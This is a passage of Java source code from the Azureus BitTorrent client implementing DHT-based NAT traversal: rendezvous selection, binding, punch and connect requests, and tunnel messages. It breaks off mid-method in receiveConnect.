/*
 * Created on 11-Aug-2005
 * Created by Paul Gardner
 * Copyright (C) 2005, 2006 Aelitis, All Rights Reserved.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * AELITIS, SAS au capital de 46,603.30 euros
 * 8 Allee Lenotre, La Grille Royale, 78600 Le Mesnil le Roi, France.
 *
 */

package com.aelitis.azureus.core.dht.nat.impl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.InetSocketAddress;
import java.security.*;
import java.security.spec.RSAPublicKeySpec;
import java.util.*;

import org.gudy.azureus2.core3.util.AESemaphore;
import org.gudy.azureus2.core3.util.AEThread2;
import org.gudy.azureus2.core3.util.BDecoder;
import org.gudy.azureus2.core3.util.Base32;
import org.gudy.azureus2.core3.util.Debug;
import org.gudy.azureus2.core3.util.SHA1Simple;
import org.gudy.azureus2.core3.util.SimpleTimer;
import org.gudy.azureus2.core3.util.SystemTime;
import org.gudy.azureus2.core3.util.TimerEvent;
import org.gudy.azureus2.core3.util.TimerEventPerformer;
import org.gudy.azureus2.plugins.PluginInterface;
import org.gudy.azureus2.plugins.utils.*;


import com.aelitis.azureus.core.dht.DHT;
import com.aelitis.azureus.core.dht.DHTLogger;
import com.aelitis.azureus.core.dht.DHTOperationAdapter;
import com.aelitis.azureus.core.dht.DHTOperationListener;
import com.aelitis.azureus.core.dht.nat.*;
import com.aelitis.azureus.core.dht.transport.*;
import com.aelitis.azureus.core.dht.transport.udp.*;

public class 
DHTNATPuncherImpl
	implements DHTNATPuncher
{
	private static boolean		TESTING	= false;
	private static boolean		TRACE	= false;
	
	static{
		if ( TESTING ){
			System.out.println( "**** DHTNATPuncher test on ****" );
		}
		if ( TRACE ){
			System.out.println( "**** DHTNATPuncher trace on ****" );
		}
	}
	
	private static final int	RT_BIND_REQUEST			= 0;
	private static final int	RT_BIND_REPLY			= 1;	
	private static final int	RT_PUNCH_REQUEST		= 2;
	private static final int	RT_PUNCH_REPLY			= 3;	
	private static final int	RT_CONNECT_REQUEST		= 4;
	private static final int	RT_CONNECT_REPLY		= 5;	
	private static final int	RT_TUNNEL_INBOUND		= 6;	
	private static final int	RT_TUNNEL_OUTBOUND		= 7;	
	private static final int	RT_QUERY_REQUEST		= 8;
	private static final int	RT_QUERY_REPLY			= 9;	
	private static final int	RT_CLOSE_REQUEST		= 10;	
	private static final int	RT_CLOSE_REPLY			= 11;	

	
	
	private static final int	RESP_OK			= 0;
	private static final int	RESP_NOT_OK		= 1;
	private static final int	RESP_FAILED		= 2;
	
	private static byte[]		transfer_handler_key = new SHA1Simple().calculateHash("Aelitis:NATPuncher:TransferHandlerKey".getBytes());
	
	private boolean				started;
	
	private DHTNATPuncherAdapter	adapter;
	private	DHT						dht;
	private DHTLogger				logger;
	
	private PluginInterface		plugin_interface;
	private Formatters			formatters;
	private UTTimer				timer;
	
	private static final int	REPUBLISH_TIME_MIN 			= 5*60*1000;
	private static final int	TRANSFER_TIMEOUT			= 30*1000;
	private static final int	RENDEZVOUS_LOOKUP_TIMEOUT	= 30*1000;
	private static final int	TUNNEL_TIMEOUT				= 3*1000;

	private static final int	RENDEZVOUS_SERVER_MAX			= 8;
	private static final int	RENDEZVOUS_SERVER_TIMEOUT 		= 5*60*1000;
	private static final int	RENDEZVOUS_CLIENT_PING_PERIOD	= 50*1000;		// some routers only hold tunnel for 60s
	private static final int	RENDEZVOUS_PING_FAIL_LIMIT		= 4;			// if you make this < 2 change code below!
	
	private Monitor	server_mon;
	private Map 	rendezvous_bindings = new HashMap();
	
	private long	last_publish;
	
	private Monitor	pub_mon;
	private boolean	publish_in_progress;
	
	private volatile DHTTransportContact		rendezvous_local_contact;
	private volatile DHTTransportContact		rendezvous_target;
	private volatile DHTTransportContact		last_ok_rendezvous;
	
	private static final int FAILED_RENDEZVOUS_HISTORY_MAX	= 16;
	
	private Map		failed_rendezvous	= 
		new LinkedHashMap(FAILED_RENDEZVOUS_HISTORY_MAX,0.75f,true)
		{
			protected boolean 
			removeEldestEntry(
		   		Map.Entry eldest) 
			{
				return size() > FAILED_RENDEZVOUS_HISTORY_MAX;
			}
		};
	
	private boolean	rendezvous_thread_running;
	
	private Map		explicit_rendezvous_map		= new HashMap();
	
	private Monitor	punch_mon;
	private List	oustanding_punches 	= new ArrayList();
	
	
	private DHTTransportContact		current_local		= null;
	private DHTTransportContact		current_target		= null;
	private int	rendevzous_fail_count = 0;
	
	
	
	public
	DHTNATPuncherImpl(
		DHTNATPuncherAdapter	_adapter,
		DHT						_dht )
	{
		adapter	= _adapter;
		dht		= _dht;
	
		logger	= dht.getLogger();
		
		plugin_interface	= dht.getLogger().getPluginInterface();
		
		formatters	= plugin_interface.getUtilities().getFormatters();
		pub_mon		= plugin_interface.getUtilities().getMonitor();
		server_mon	= plugin_interface.getUtilities().getMonitor();
		punch_mon	= plugin_interface.getUtilities().getMonitor();
		
		timer = plugin_interface.getUtilities().createTimer(
						"DHTNATPuncher:refresher", true );
	}
	
	public void
	start()
	{
		if ( started ){
			
			return;
		}
		
		started	= true;
		
		DHTTransport	transport = dht.getTransport();
		
		transport.addListener(
			new DHTTransportListener()
			{
				public void
				localContactChanged(
					DHTTransportContact	local_contact )
				{
					publish( false );
				}
				
				public void
				resetNetworkPositions()
				{
				}
				
				public void
				currentAddress(
					String		address )
				{
				}
				
				public void
				reachabilityChanged(
					boolean	reacheable )
				{
					publish( false );
				}
			});
		
	
		transport.registerTransferHandler(
			transfer_handler_key,
			new DHTTransportTransferHandler()
			{
				public String
				getName()
				{
					return( "NAT Traversal" );
				}
				
				public byte[]
	        	handleRead(
	        		DHTTransportContact	originator,
	        		byte[]				key )
				{
					return( null );
				}
				        	
	        	public byte[]
	        	handleWrite(
	        		DHTTransportContact	originator,
	        		byte[]				key,
	        		byte[]				value )
	        	{
	        		return( receiveRequest((DHTTransportUDPContact)originator, value ));
	        	}
			});
		
		timer.addPeriodicEvent(	
				REPUBLISH_TIME_MIN,
				new UTTimerEventPerformer()
				{
					public void
					perform(
						UTTimerEvent		event )
					{
						publish( false );
					}
				});
				
		timer.addPeriodicEvent(	
				RENDEZVOUS_SERVER_TIMEOUT/2,
				new UTTimerEventPerformer()
				{
					public void
					perform(
						UTTimerEvent		event )
					{
						long	now = plugin_interface.getUtilities().getCurrentSystemTime();
						
						try{
							server_mon.enter();
							
							Iterator	it = rendezvous_bindings.values().iterator();
							
							while( it.hasNext()){
								
								Object[]	entry = (Object[])it.next();
								
								long	time = ((Long)entry[1]).longValue();
								
								boolean	removed = false;
								
								if ( time > now ){
									
										// clock change, easiest approach is to remove it
									
									it.remove();
								
									removed	= true;
									
								}else if ( now - time > RENDEZVOUS_SERVER_TIMEOUT ){
									
										// timeout
									
									it.remove();
									
									removed = true;
								}
								
								if ( removed ){
									
									log( "Rendezvous " + ((DHTTransportContact)entry[0]).getString() + " removed due to inactivity" );
								}
							}
						}finally{
							
							server_mon.exit();
						}
					}
				});
		
		publish( false );
	}
	
	public boolean
	active()
	{
		return( rendezvous_local_contact != null );
	}
	
	public boolean
	operational()
	{
		DHTTransportContact	ok = last_ok_rendezvous;
		
		if ( ok != null && ok == rendezvous_target ){
			
			return( true );
		}
		
		return( false );	
	}
	
	protected void
	publish(
		final boolean		force )
	{
		long now = plugin_interface.getUtilities().getCurrentSystemTime();
		
		if ( now < last_publish && !force ){
			
			last_publish	= now;
			
		}else{
			
			if ( force || now - last_publish >= REPUBLISH_TIME_MIN ){
				
				last_publish	= now;
				
				plugin_interface.getUtilities().createThread(
					"DHTNATPuncher:publisher",
					new Runnable()
					{
						public void
						run()
						{
							try{
								pub_mon.enter();
								
								if ( publish_in_progress ){
									
									return;
								}
								
								publish_in_progress	= true;
								
							}finally{
								
								pub_mon.exit();
							}
							
							try{
								publishSupport();
								
							}finally{
								
								try{
									pub_mon.enter();
									
									publish_in_progress	= false;
									
								}finally{
									
									pub_mon.exit();
								}
							}
						}
					});
			}
		}
	}
	
	protected void
	publishSupport()
	{
		DHTTransport	transport = dht.getTransport();
	
		if ( TESTING || !transport.isReachable() ){
			
			DHTTransportContact	local_contact = transport.getLocalContact();
			
				// see if the rendezvous has failed and therefore we are required to find a new one
			
			boolean force = 
				rendezvous_target != null && 
				failed_rendezvous.containsKey( rendezvous_target.getAddress());
			
			if ( rendezvous_local_contact != null && !force ){
				
				if ( local_contact.getAddress().equals( rendezvous_local_contact.getAddress())){
					
						// already running for the current local contact
					
					return;
				}
			}
			
			DHTTransportContact	explicit = (DHTTransportContact)explicit_rendezvous_map.get( local_contact.getAddress());
			
			if ( explicit != null ){
				
				try{
					pub_mon.enter();
				
					rendezvous_local_contact	= local_contact;
					rendezvous_target			= explicit;
				
					runRendezvous();
					
				}finally{
					
					pub_mon.exit();
				}
			}else{
				
				final DHTTransportContact[] new_rendezvous_target			= { null };
				
				DHTTransportContact[]	reachables = dht.getTransport().getReachableContacts();
					
				int reachables_tried	= 0;
				int reachables_skipped	= 0;
				
				final Semaphore sem = plugin_interface.getUtilities().getSemaphore();
				
				for (int i=0;i<reachables.length;i++){
					
					DHTTransportContact	contact = reachables[i];
					
					try{
						pub_mon.enter();
	
							// see if we've found a good one yet
						
						if ( new_rendezvous_target[0] != null ){
						
							break;
						}
						
							// skip any known bad ones
						
						if ( failed_rendezvous.containsKey( contact.getAddress())){
							
							reachables_skipped++;
							
							sem.release();
							
							continue;
						}
					}finally{
						
						pub_mon.exit();
					}
					
					if ( i > 0 ){
						
						try{
							Thread.sleep( 1000 );
							
						}catch( Throwable e ){
							
						}
					}
					
					reachables_tried++;
					
					contact.sendPing(
						new DHTTransportReplyHandlerAdapter()
						{
							public void
							pingReply(
								DHTTransportContact ok_contact )
							{
								trace( "Punch:" + ok_contact.getString() + " OK" );
								
								try{
									pub_mon.enter();
								
									if ( new_rendezvous_target[0] == null ){
									
										new_rendezvous_target[0] = ok_contact;
									}
								}finally{
									
									pub_mon.exit();
									
									sem.release();
								}
							}
							
							public void
							failed(
								DHTTransportContact 	failed_contact,
								Throwable				e )
							{
								try{
									trace( "Punch:" + failed_contact.getString() + " Failed" );
									
								}finally{
									
									sem.release();
								}
							}
						});
				}
				
				for (int i=0;i<reachables.length;i++){
	
					sem.reserve();
					
					try{
						pub_mon.enter();
	
						if ( new_rendezvous_target[0] != null ){
						
							rendezvous_target			= new_rendezvous_target[0];					
							rendezvous_local_contact	= local_contact;
						
							log( "Rendezvous found: " + rendezvous_local_contact.getString() + " -> " + rendezvous_target.getString());
	
							runRendezvous();
						
							break;
						}
					}finally{
						
						pub_mon.exit();
					}
				}
			
				if ( new_rendezvous_target[0] == null ){
				
					log( "No rendezvous found: candidates=" + reachables.length +",tried="+ reachables_tried+",skipped=" +reachables_skipped );
							
					try{
						pub_mon.enter();
	
						rendezvous_local_contact	= null;
						rendezvous_target			= null;
						
					}finally{
						
						pub_mon.exit();
					}
				}
			}
		}else{
			
			try{
				pub_mon.enter();

				rendezvous_local_contact	= null;
				rendezvous_target			= null;
				
			}finally{
				
				pub_mon.exit();
			}
		}
	}
	
	protected void
	runRendezvous()
	{
		try{
			pub_mon.enter();

			if ( !rendezvous_thread_running ){
				
				rendezvous_thread_running	= true;
				
				plugin_interface.getUtilities().createThread(
					"DHTNatPuncher:rendevzous",
					new Runnable()
					{
						public void
						run()
						{
							runRendezvousSupport();
						}
					});
			}
		}finally{
			
			pub_mon.exit();
		}
	}
		
	protected void
	runRendezvousSupport()
	{
		
		SimpleTimer.addPeriodicEvent(
				"DHTNAT:cp",
				RENDEZVOUS_CLIENT_PING_PERIOD,
        new TimerEventPerformer() {
          public void perform( TimerEvent ev ) {
       
          	try{
      				DHTTransportContact		latest_local;
      				DHTTransportContact		latest_target;
      				
      				try{
      					pub_mon.enter();
      					
      					latest_local	= rendezvous_local_contact;
      					latest_target	= rendezvous_target;
      				}finally{
      					
      					pub_mon.exit();
      				}
      				
      				if ( current_local != null || latest_local != null ){
      				
      						// one's not null, worthwhile further investigation
      					
      					if ( current_local != latest_local ){
      				
      							// local has changed, remove existing publish
      						
      						if ( current_local != null ){
      							
      							log( "Removing publish for " + current_local.getString() + " -> " + current_target.getString());
      							
      							dht.remove( 
      									getPublishKey( current_local ),
      									"DHTNatPuncher: removal of publish",
      									new DHTOperationListener()
      									{
      										public void
      										searching(
      											DHTTransportContact	contact,
      											int					level,
      											int					active_searches )
      										{}
      										
      										public void
      										found(
      											DHTTransportContact	contact,
      											boolean				is_closest )
      										{}
      										
      										public void
      										diversified(
      											String		desc )
      										{
      										}
      										
      										public void
      										read(
      											DHTTransportContact	contact,
      											DHTTransportValue	value )
      										{}
      										
      										public void
      										wrote(
      											DHTTransportContact	contact,
      											DHTTransportValue	value )
      										{}
      										
      										public void
      										complete(
      											boolean				timeout )
      										{}
      									});
      						}
      						
      						if ( latest_local != null ){
      					
      							log( "Adding publish for " + latest_local.getString() + " -> " + latest_target.getString());
      							
      							rendevzous_fail_count	= RENDEZVOUS_PING_FAIL_LIMIT - 2; // only 2 attempts to start with

      							dht.put(
      									getPublishKey( latest_local ),
      									"NAT Traversal: rendezvous publish",
      									encodePublishValue( latest_target ),
      									DHT.FLAG_SINGLE_VALUE,
      									new DHTOperationListener()
      									{
      										public void
      										searching(
      											DHTTransportContact	contact,
      											int					level,
      											int					active_searches )
      										{}
      										
      										public void
      										found(
      											DHTTransportContact	contact,
      											boolean				is_closest )
      										{}
      										
      										public void
      										diversified(
      											String		desc )
      										{
      										}
      										
      										public void
      										read(
      											DHTTransportContact	contact,
      											DHTTransportValue	value )
      										{}
      										
      										public void
      										wrote(
      											DHTTransportContact	contact,
      											DHTTransportValue	value )
      										{}
      										
      										public void
      										complete(
      											boolean				timeout )
      										{}
      									});
      						}
      					}else if ( current_target != latest_target ){
      						
      							// here current_local == latest_local and neither is null! 
      						
      							// target changed, update publish
      						
      						log( "Updating publish for " + latest_local.getString() + " -> " + latest_target.getString());

      						rendevzous_fail_count	= RENDEZVOUS_PING_FAIL_LIMIT - 2; // only 2 attempts to start with
      						
      						dht.put(
      								getPublishKey( latest_local ),
      								"DHTNatPuncher: update publish",
      								encodePublishValue( latest_target ),
      								DHT.FLAG_SINGLE_VALUE,
      								new DHTOperationListener()
      								{
      									public void
      									searching(
      										DHTTransportContact	contact,
      										int					level,
      										int					active_searches )
      									{}
      									
      									public void
      									found(
      										DHTTransportContact	contact,
      										boolean				is_closest )
      									{}
      									
      									public void
      									diversified(
      										String		desc )
      									{
      									}
      									
      									public void
      									read(
      										DHTTransportContact	contact,
      										DHTTransportValue	value )
      									{}
      									
      									public void
      									wrote(
      										DHTTransportContact	contact,
      										DHTTransportValue	value )
      									{}
      									
      									public void
      									complete(
      										boolean				timeout )
      									{}
      								});
      					}
      				}
      				
      				current_local	= latest_local;
      				current_target	= latest_target;
      	
      				if ( current_target != null ){
      							
      					int	bind_result = sendBind( current_target );
      					
      					if ( bind_result == RESP_OK ){
      												
      						trace( "Rendezvous:" + current_target.getString() + " OK" );
      												
      						rendevzous_fail_count	= 0;
      						
      						if ( last_ok_rendezvous != current_target ){
      							
      							last_ok_rendezvous = current_target;
      							
      							log( "Rendezvous " + latest_target.getString() + " operational" );
      						}
      					}else{
      						
      						if ( bind_result == RESP_NOT_OK ){
      							
      								// denied access
      							
      							rendevzous_fail_count = RENDEZVOUS_PING_FAIL_LIMIT;
      							
      						}else{
      							
      							rendevzous_fail_count++;
      						}
      						
      						if ( rendevzous_fail_count == RENDEZVOUS_PING_FAIL_LIMIT ){
      							
      							rendezvousFailed( current_target, false );
      						}			
      					}					
      				}
      				
      			}catch( Throwable e ){
      				
      				log(e);
      				
      			}
          }
        }
     );
		
		
	
	}
	
	
	
	protected void
	rendezvousFailed(
		DHTTransportContact	current_target,
		boolean				tidy )
	{
		log( "Rendezvous " + (tidy?"closed":"failed") + ": " + current_target.getString());
		
		try{
			pub_mon.enter();
		
			failed_rendezvous.put( current_target.getAddress(), "" );
			
		}finally{
			
			pub_mon.exit();
		}
		
		publish( true );
	}
	
	protected byte[]
	sendRequest(
		DHTTransportContact		target,
		byte[]					data,
		int						timeout )
	{
		try{
			return(
				dht.getTransport().writeReadTransfer(
					new DHTTransportProgressListener()
					{
						public void
						reportSize(
							long	size )
						{
						}
						
						public void
						reportActivity(
							String	str )
						{
						}
						
						public void
						reportCompleteness(
							int		percent )
						{						
						}
					},
					target,
					transfer_handler_key,
					data,
					timeout ));
				
		}catch( DHTTransportException e ){
			
			// log(e); timeout most likely
			
			return( null );
		}		
	}
	

	protected byte[]
	receiveRequest(
		DHTTransportUDPContact		originator,
		byte[]						data )
	{
		try{
			Map	res = receiveRequest( originator, formatters.bDecode( data ));
			
			if ( res == null ){
				
				return( null );
			}
			
			return( formatters.bEncode( res ));
			
		}catch( Throwable e ){
			
			log(e);
			
			return( null );
		}
	}
	
	protected Map
	sendRequest(
		DHTTransportContact		target,
		Map						data,
		int						timeout )
	{
		try{
			byte[]	res = sendRequest( target, formatters.bEncode( data ), timeout );
			
			if ( res == null ){
				
				return( null );
			}
			
			return( formatters.bDecode( res ));
			
		}catch( Throwable e ){
			
			log(e);
			
			return( null );
		}
	}
	
	protected Map
	receiveRequest(
		DHTTransportUDPContact	originator,
		Map						data )
	{		
		int	type = ((Long)data.get("type")).intValue();
		
		Map	response = new HashMap();
		
		switch( type ){
		
			case RT_BIND_REQUEST:
			{
				response.put( "type", new Long( RT_BIND_REPLY ));
				
				receiveBind( originator, data, response );
				
				break;
			}
			case RT_CLOSE_REQUEST:
			{
				response.put( "type", new Long( RT_CLOSE_REPLY ));
				
				receiveClose( originator, data, response );
				
				break;
			}
			case RT_QUERY_REQUEST:
			{
				response.put( "type", new Long( RT_QUERY_REPLY ));
				
				receiveQuery( originator, data, response );
				
				break;
			}
			case RT_PUNCH_REQUEST:
			{
				response.put( "type", new Long( RT_PUNCH_REPLY ));
				
				receivePunch( originator, data, response );
				
				break;
			}
			case RT_CONNECT_REQUEST:
			{
				response.put( "type", new Long( RT_CONNECT_REPLY ));
				
				receiveConnect( originator, data, response );
				
				break;
			}
			case RT_TUNNEL_INBOUND:
			{				
				receiveTunnelInbound( originator, data );
				
				response = null;
				
				break;
			}
			case RT_TUNNEL_OUTBOUND:
			{				
				receiveTunnelOutbound( originator, data );
				
				response = null;
				
				break;
			}
			default:
			{
				response = null;
				
				break;
			}
		}
		
		Map	debug	= (Map)data.get( "_debug" );
		
		if ( debug != null ){
			
			Map	out = handleDebug( debug );
			
			if ( out != null ){
				
				response.put( "_debug", out );
			}
		}

		return( response );
	}
	
	protected boolean
	sendTunnelMessage(
		DHTTransportContact		target,
		Map						data )
	{
		try{
			return( sendTunnelMessage( target, formatters.bEncode( data )));
			
		}catch( Throwable e ){
			
			log(e);
			
			return( false );
		}
	}
	
	protected boolean
   	sendTunnelMessage(
   		DHTTransportContact		target,
   		byte[]					data )
   	{
   		try{
			dht.getTransport().writeTransfer(
				new DHTTransportProgressListener()
				{
					public void
					reportSize(
						long	size )
					{
					}
					
					public void
					reportActivity(
						String	str )
					{
					}
					
					public void
					reportCompleteness(
						int		percent )
					{						
					}
				},
				target,
				transfer_handler_key,
				new byte[0],
				data,
				TUNNEL_TIMEOUT );
   					
			return( true );
			
   		}catch( DHTTransportException e ){
   			
   			// log(e); timeout most likely
   			
   			return( false );
   		}		
   	}
	
	protected int
	sendBind(
		DHTTransportContact	target )
	{
		try{
			Map	request = new HashMap();
			
			request.put("type", new Long( RT_BIND_REQUEST ));
			
			Map response = sendRequest( target, request, TRANSFER_TIMEOUT );
			
			if ( response == null ){
				
				return( RESP_FAILED );
			}
			
			if (((Long)response.get( "type" )).intValue() == RT_BIND_REPLY ){
				
				int	result = ((Long)response.get("ok")).intValue();
					
				trace( "received bind reply: " + (result==0?"failed":"ok" ));
					
				if ( result == 1 ){
					
					return( RESP_OK );
				}
			}
			
			return( RESP_NOT_OK );
			
		}catch( Throwable e ){
			
			log(e);
			
			return( RESP_FAILED );
		}
	}
	
	protected void
	receiveBind(
		DHTTransportUDPContact	originator,
		Map						request,
		Map						response )
	{
		trace( "received bind request" );
		
		boolean	ok 	= true;
		boolean	log	= true;
		
		try{
			server_mon.enter();
		
			Object[]	entry = (Object[])rendezvous_bindings.get( originator.getAddress().toString());
			
			if ( entry == null ){
			
				if ( rendezvous_bindings.size() == RENDEZVOUS_SERVER_MAX ){
					
					ok	= false;
				}
			}else{
				
					// already present, no need to log again
				
				log	= false;
			}
			
			if ( ok ){
				
				long	now = plugin_interface.getUtilities().getCurrentSystemTime();
				
				rendezvous_bindings.put( originator.getAddress().toString(), new Object[]{ originator, new Long( now )});
				
				response.put( "port", new Long( originator.getAddress().getPort()));
			}
		}finally{
			
			server_mon.exit();
		}
		
		if ( log ){
			
			log( "Rendezvous request from " + originator.getString() + " " + (ok?"accepted":"denied" ));
		}
		
		response.put( "ok", new Long(ok?1:0));
	}
		
	public void
	destroy()
	{
		try{
			server_mon.enter();
			
			Iterator	it = rendezvous_bindings.values().iterator();
			
			while( it.hasNext()){
				
				Object[]	entry = (Object[])it.next();
				
				final DHTTransportUDPContact	contact = (DHTTransportUDPContact)entry[0];
				
				new AEThread2( "DHTNATPuncher:destroy", true )
				{
					public void
					run()
					{
						sendClose( contact );
					}
				}.start();
			}
		}catch( Throwable e ){
			
			log( e );
			
		}finally{
			
			server_mon.exit();
		}
	}
	
	protected int
	sendClose(
		DHTTransportContact	target )
	{
		try{
			Map	request = new HashMap();
			
			request.put("type", new Long( RT_CLOSE_REQUEST ));
			
			Map response = sendRequest( target, request, TRANSFER_TIMEOUT );
			
			if ( response == null ){
				
				return( RESP_FAILED );
			}
			
			if (((Long)response.get( "type" )).intValue() == RT_CLOSE_REPLY ){
				
				int	result = ((Long)response.get("ok")).intValue();
					
				trace( "received close reply: " + (result==0?"failed":"ok" ));
					
				if ( result == 1 ){
					
					return( RESP_OK );
				}
			}
			
			return( RESP_NOT_OK );
			
		}catch( Throwable e ){
			
			log(e);
			
			return( RESP_FAILED );
		}
	}
	
	protected void
	receiveClose(
		DHTTransportUDPContact	originator,
		Map						request,
		Map						response )
	{		
		trace( "received close request" );
					
		final DHTTransportContact	current_target = rendezvous_target;
	
		if ( current_target != null && Arrays.equals( current_target.getID(), originator.getID())){
			
			new AEThread2( "DHTNATPuncher:close", true )
			{
				public void
				run()
				{
					rendezvousFailed( current_target, true );
				}
			}.start();
		}
		
		response.put( "ok", new Long(1));
	}
	
	

    /**
     * XXX: unused
     */
    private int
	sendQuery(
		DHTTransportContact	target )
	{
		try{
			Map	request = new HashMap();
			
			request.put("type", new Long( RT_QUERY_REQUEST ));
			
			Map response = sendRequest( target, request, TRANSFER_TIMEOUT );
			
			if ( response == null ){
				
				return( RESP_FAILED );
			}
			
			if (((Long)response.get( "type" )).intValue() == RT_QUERY_REPLY ){
				
				int	result = ((Long)response.get("ok")).intValue();
					
				trace( "received query reply: " + (result==0?"failed":"ok" ));
					
				if ( result == 1 ){
					
					return( RESP_OK );
				}
			}
			
			return( RESP_NOT_OK );
			
		}catch( Throwable e ){
			
			log(e);
			
			return( RESP_FAILED );
		}
	}
	
	protected void
	receiveQuery(
		DHTTransportUDPContact	originator,
		Map						request,
		Map						response )
	{		
		trace( "received query request" );
					
		InetSocketAddress	address = originator.getTransportAddress();
		
		response.put( "ip", address.getAddress().getHostAddress().getBytes());
		
		response.put( "port", new Long( address.getPort()));
		
		response.put( "ok", new Long(1));
	}
	
	protected Map
	sendPunch(
		DHTTransportContact 			rendezvous,
		final DHTTransportUDPContact	target,
		Map								originator_client_data,
		boolean							no_tunnel )
	{		
		AESemaphore	wait_sem 	= new AESemaphore( "DHTNatPuncher::sendPunch" );
		Object[]	wait_data 	= new Object[]{ target, wait_sem, new Integer(0)};
		
		try{

			try{
				punch_mon.enter();
			
				oustanding_punches.add( wait_data );
				
			}finally{
				
				punch_mon.exit();
			}
			
			Map	request = new HashMap();
			
			request.put("type", new Long( RT_PUNCH_REQUEST ));
			
			request.put("target", target.getAddress().toString().getBytes());
			
			if ( originator_client_data != null ){
				
				if ( no_tunnel ){
					
					originator_client_data.put( "_notunnel", new Long(1));
				}
				
				request.put( "client_data", originator_client_data );
			}
	
				// for a message payload (i.e. no_tunnel) we double the initiator timeout to give
				// more chance for reasonable size messages to get through as they have to go through
				// 2 xfer processes
			
			Map response = sendRequest( rendezvous, request, no_tunnel?TRANSFER_TIMEOUT*2:TRANSFER_TIMEOUT );
			
			if ( response == null ){
				
				return( null );
			}
			
			if (((Long)response.get( "type" )).intValue() == RT_PUNCH_REPLY ){
				
				int	result = ((Long)response.get("ok")).intValue();

				trace( "received " + ( no_tunnel?"message":"punch") + " reply: " + (result==0?"failed":"ok" ));
				
				if ( result == 1 ){
					
						// pick up port changes from the rendezvous
											
					Long	indirect_port = (Long)response.get( "port" );
					
					if ( indirect_port != null ){
						
						int transport_port	= indirect_port.intValue();
				
						if ( transport_port != 0 ){
						
							InetSocketAddress	existing_address = target.getTransportAddress();
						
							if ( transport_port != existing_address.getPort()){
							
								target.setTransportAddress(
										new InetSocketAddress(existing_address.getAddress(), transport_port ));
							}
						}
					}	
					
					if ( !no_tunnel ){
						
							// ping the target a few times to try and establish a tunnel
											
						UTTimerEvent	event = 
							timer.addPeriodicEvent(
									3000,
									new UTTimerEventPerformer()
									{
										private int	pings = 1;
										
										public void
										perform(
											UTTimerEvent		event )
										{
											if ( pings > 3 ){
												
												event.cancel();
											
												return;
											}
										
											pings++;
												
											if ( sendTunnelOutbound( target )){
												
												event.cancel();
											}
										}
									});
							
						if ( sendTunnelOutbound( target )){
							
							event.cancel();
						}
						
							// give the other end a few seconds to kick off some tunnel events to us
						
						if ( wait_sem.reserve(10000)){
							
							event.cancel();
						}
					}
											
						// routers often fiddle with the port when not mapped so we need to grab the right one to use
						// for direct communication
					
						// first priority goes to direct tunnel messages received
					
					int	transport_port = 0;
					
					try{
						punch_mon.enter();
					
						transport_port = ((Integer)wait_data[2]).intValue();
						
					}finally{
						
						punch_mon.exit();
					}
				
					if ( transport_port != 0 ){
						
						InetSocketAddress	existing_address = target.getTransportAddress();
						
						if ( transport_port != existing_address.getPort()){
							
							target.setTransportAddress(
								new InetSocketAddress(existing_address.getAddress(), transport_port ));
						}
					}
					
					Map	target_client_data = (Map)response.get( "client_data" );
					
					if ( target_client_data == null ){
						
						target_client_data = new HashMap();
					}
					
					return( target_client_data );
				}
			}
			
			return( null );
			
		}catch( Throwable e ){
			
			log(e);
			
			return( null );
			
		}finally{
			
			try{
				punch_mon.enter();
			
				oustanding_punches.remove( wait_data );
				
			}finally{
				
				punch_mon.exit();
			}
		}
	}
	
	protected void
	receivePunch(
		DHTTransportUDPContact		originator,
		Map							request,
		Map							response )
	{
		trace( "received punch request" );
		
		boolean	ok = false;
		
		String	target_str = new String((byte[])request.get( "target" ));
		
		Object[] entry;
		
		try{
			server_mon.enter();
		
			entry = (Object[])rendezvous_bindings.get( target_str );
		
		}finally{
			
			server_mon.exit();
		}
		
		if ( entry != null ){
			
			DHTTransportUDPContact	target = (DHTTransportUDPContact)entry[0];
			
			Map target_client_data = sendConnect( target, originator, (Map)request.get( "client_data" ));
			
			if ( target_client_data != null ){
				
				response.put( "client_data", target_client_data );
																
				response.put( "port", new Long( target.getTransportAddress().getPort()));
				
				ok	= true;
			}
		}
		
		log( "Rendezvous punch request from " + originator.getString() + " to " + target_str + " " + (ok?"initiated":"failed"));

		response.put( "ok", new Long(ok?1:0));
	}
	
	protected Map
	sendConnect(
		DHTTransportContact target,
		DHTTransportContact	originator,
		Map					originator_client_data )
	{
		try{
			Map	request = new HashMap();
			
			request.put("type", new Long( RT_CONNECT_REQUEST ));
			
			request.put("origin", encodeContact( originator ));
							
			request.put( "port", new Long( ((DHTTransportUDPContact)originator).getTransportAddress().getPort()));
			
			if ( originator_client_data != null ){
				
				request.put( "client_data", originator_client_data );
			}
			
			Map response = sendRequest( target, request, TRANSFER_TIMEOUT );
			
			if ( response == null ){
				
				return( null );
			}
			
			if (((Long)response.get( "type" )).intValue() == RT_CONNECT_REPLY ){
				
				int	result = ((Long)response.get("ok")).intValue();

				trace( "received connect reply: " + (result==0?"failed":"ok" ));

				if ( result == 1 ){
					
					Map target_client_data = (Map)response.get( "client_data" );
					
					if ( target_client_data == null ){
						
						target_client_data = new HashMap();
					}
					
					return( target_client_data );
				}
			}
			
			return( null );
			
		}catch( Throwable e ){
			
			log(e);
			
			return( null );
		}
	}
	
	protected void
	receiveConnect(
		DHTTransportContact		rendezvous,
		Map						request,
		Map						response )
	{
		trace( "received connect request" );

		boolean	ok = false;
			
			// ensure that we've received this from our current rendezvous node
		
		DHTTransportContact	rt = rendezvous_target;
		
		if ( rt != null && rt.getAddress().equals( rendezvous.getAddress())){
					
			final DHTTransportUDPContact	target = decodeContact( (byte[])request.get( "origin" ));
			
			if ( target != null ){
													
				int	transport_port = 0;
				
				Long	indirect_port = (Long)request.get( "port" );
			
				if ( indirect_port != null ){
				
					transport_port	= indirect_port.intValue();
				}
			
				if ( transport_port != 0 ){
				
					InetSocketAddress	existing_address = target.getTransportAddress();
				
					if ( transport_port != existing_address.getPort()){
						
						target.setTransportAddress(
